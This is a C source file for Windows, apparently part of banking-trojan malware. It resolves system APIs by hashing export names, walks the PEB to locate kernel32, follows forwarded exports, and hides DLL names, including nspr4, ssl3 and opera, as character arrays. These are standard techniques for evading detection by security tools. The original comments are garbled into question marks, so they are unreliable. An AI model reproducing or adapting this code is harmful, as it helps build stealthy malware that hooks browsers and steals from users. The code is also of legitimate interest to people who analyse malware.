#include <windows.h>

#include "Getapi.h"
#include "Crypt.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "ntdll.h"

DWORD pGetLastError()
{
	DWORD dwRet = 0;

	__asm
	{
		MOV EAX,DWORD PTR FS:[18h]
		MOV EAX,DWORD PTR DS:[EAX+34h]
		MOV [dwRet], EAX
	}

	return dwRet;
}

HMODULE GetKernel32(void)
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == 0x4B1FFE8E )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

HMODULE GetDllBase( DWORD dwDllHash )
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == dwDllHash )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

LPVOID GetForvardedProc(PCHAR Name)
{
	// ??????? ????????? ?????????????? ????????
	// ?? ????? ?????? ???? ?????? DllName.ProcName ??? DllName.#ProcNomber
	if (Name == NULL)
 		return NULL;

	char DLLName[255];
	m_memset(DLLName, 0, sizeof(DLLName));

	PCHAR NameStr = STR::Scan(Name, '.');
	if (NameStr == NULL)
		return NULL;

	// ???????? ??? ??????????
	m_memcpy(DLLName, Name, NameStr - Name);

	m_lstrcat(DLLName, ".dll");

	// ?????????? ??? ???????
	NameStr++;
	if (*NameStr == '#')
	{
		// ??? ???????? ??????? ???????
		NameStr++;
		DWORD OrdNomber = m_atoi(NameStr);
		return GetProcAddressEx(DLLName, 0, OrdNomber);
	}
	DWORD Hash = CalcHash(NameStr);
	return GetProcAddressEx(DLLName, 0, Hash);
}


LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
{
	/*----------- ??????? ?????????? ????? ??????? ?? ?? ???????? -----------*/

    // ???????? ????? ?????????????? PE ??????????
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	// ???????? ????? ??????? ????????
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	int Ordinal = 0; // ????? ??????????? ??? ???????

	if ( HIWORD(ProcNameHash) == 0 )
	{
		// ???? ??????? ?? ?? ??????
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// ???? ??????? ?? ??????
		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		unsigned int i;
		char * ProcName;
		for ( i = 0; i < Table->NumberOfNames; i++)
		{
			ProcName = (char*)RVATOVA(Module, *NamesTable);
			if (CalcHash(ProcName) == ProcNameHash )
			{
				Ordinal = *OrdinalTable;
				break;
			}
			// ??????????? ??????? ? ???????
			NamesTable++;
			OrdinalTable++;
		}
	}

	// ?? ????? ?????
	if (Ordinal == 0)
		return NULL;

	// ?????????? ????? ???????
	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	DWORD RVA		  = AddrTable[Ordinal];
	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );

	// ????????? ?? ?????????????? ????????
	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);

	return (LPVOID)Ret;
}


LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash )
{

//-----------------------------------------------------------------------------

	// ???????? ???????????? ?????????
	//char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',0};
	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',0};
	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
	//-----------------------------------------------------------------------
	HMODULE hModule = NULL;


	char *DllName = NULL;

	if ( Dll == NULL )
	{
		switch ( dwModule ) 
		{
			case 1: 
				hModule = GetKernel32();
			break;

			case 2:
				DllName = (PCHAR)advapi32_dll;
			break;

			case 3:
				DllName = (PCHAR)user32_dll;
			break;

			case 4:
				DllName = (PCHAR)ws2_32_dll;
			break;

			case 5:
				DllName = (PCHAR)ntdll_dll;
			break;

			case 6:
				DllName = (PCHAR)winsta_dll;
			break;

			case 7:
				DllName = (PCHAR)shell32_dll;
			break;

			case 8:
				DllName = (PCHAR)wininet_dll;
			break;

			case 9:
				DllName = (PCHAR)urlmon_dll;
			break;

			case 10:
				DllName = (PCHAR)nspr4_dll;
			break;

			case 11:
				DllName = (PCHAR)ssl3_dll;
			break;

			case 12:
				DllName = (PCHAR)winmm_dll;// ??? ????????? ?????
			break;

			case 13:
				DllName = (PCHAR)cabinet_dll;//??? ?????????????
			break;
			case 14:
				DllName = (PCHAR)opera_dll;//??? ?????
			break;


			default:
				return 0;
		}
	}
	else
	{
		hModule = (HMODULE)pLoadLibraryA( Dll ); 
	}

	if ( hModule == NULL && m_lstrlen( DllName ) )
	{
		hModule = (HMODULE)pLoadLibraryA( DllName );
	}

	/*LPVOID ret = (LPVOID)0x00000000; ??? ???? ?????

	if (hModule != NULL)
		ret = GetApiAddr( hModule, dwProcNameHash );*/
/***/ // ??? ?????

	if (dwProcNameHash == 0)
		return hModule;

	LPVOID ret = GetApiAddr(hModule, dwProcNameHash);

	if ( ret == NULL )
		return (LPVOID)0x00000000;

	return ret;
} 
